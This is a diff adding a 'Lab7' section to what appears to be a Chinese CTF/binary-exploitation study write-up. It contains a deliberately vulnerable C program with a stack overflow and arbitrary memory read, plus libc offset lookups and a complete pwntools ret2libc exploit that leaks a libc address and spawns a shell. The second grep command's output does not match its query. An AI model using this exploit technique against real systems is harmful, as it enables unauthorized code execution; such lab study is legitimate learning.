@@ -446,11 +446,101 @@ r.interactive()
 
 ### # Lab7
 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main()
+{
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 2, 0);
+  char addr[16];
+  char buf[16];
+  printf("You have one chance to read the memory!\n");
+  printf("Give me the address in hex: ");
+  read(0, addr, 0x10);
+  unsigned long long iaddr = strtoll(addr, 0, 16);
+  printf("\nContent: %lld\n", *(unsigned long long *)iaddr);
+  printf("Give me your messege: ");
+  read(0, buf, 0x90);
+  return 0;
+}
+```
+
+![image-20220107212802042](/assets/img/2022/image-20220107212802042.png)
+
+```bash
+strings -t x  ./libc-2.27.so| grep "/bin/sh"
+1b3e9a /bin/sh
+
+ROPgadget --binary ./libc-2.27.so --string "/bin/sh"
+0x00000000001b3e9a : /bin/sh
+
+readelf -a ./libc-2.27.so | grep "system"
+   232: 0000000000159e20    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
+   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
+  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+  
+readelf -a ./libc-2.27.so | grep "system"
+   191: 00000000000809c0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+   422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+   496: 00000000001266c0  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+   678: 00000000001285d0   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+  1141: 000000000007f1f0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+  1677: 000000000007f1f0   396 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
+  2310: 000000000008a640   143 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
+  
+
+ROPgadget --binary ./ret2libc --only "pop|ret" | grep "rdi"
+0x00000000004007d3 : pop rdi ; ret
+```
+
+![image-20220107223357377](/assets/img/2022/image-20220107223357377.png)
+
+exp:
+
+```python
+from pwn import *
 
 
+r = process('./ret2libc', env={"LD_PRELOAD":"./libc-2.27.so"})
+# context.log_level="debug"
+# raw_input(">>>")
 
+puts_got_addr = 0x0000000000601018 # R_X86_64_JUMP_SLOT  ts@GLIBC_2.2.5
+puts_libc_offset = 0x00000000000809c0  # 512 FUNC    GLOBAL FAULT   13 _IO_puts@@GLIBC_2.2.5
+sh_offset = 0x00000000001b3e9a # /bin/sh
+system_libc_offset = 0x000000000004f440  #  45 FUNC    WEAK   FAULT   13 system@@GLIBC_2.2.5
+# pop_rdi = 0x00000000004007d3 # pop rdi ; ret
+pop_rdi_libc_offset = 0x000000000002155f # pop rdi ; ret
+ret = 0x000000000040053e # ret
 
+r.recvuntil('hex: ')
+r.send(hex(puts_got_addr))
+r.recvuntil('Content: ')
+puts_libc_addr = int(r.recvline())
+log.success("puts addr: {}".format(hex(puts_libc_addr)))
+r.recvuntil('messege: ')
 
+libc_base_addr = puts_libc_addr - puts_libc_offset
+
+p = 'a'*0x38
+p += p64(libc_base_addr + pop_rdi_libc_offset)
+p += p64(libc_base_addr + sh_offset)
+p += p64(ret)
+p += p64(libc_base_addr + system_libc_offset)
+
+r.send(p)
+
+r.interactive()
+```
+
+使用one_gadget
+
+![image-20220107223750664](/assets/img/2022/image-20220107223750664.png)
+
+![image-20220107223840052](/assets/img/2022/image-20220107223840052.png)
 
 ##  CTF wiki
 
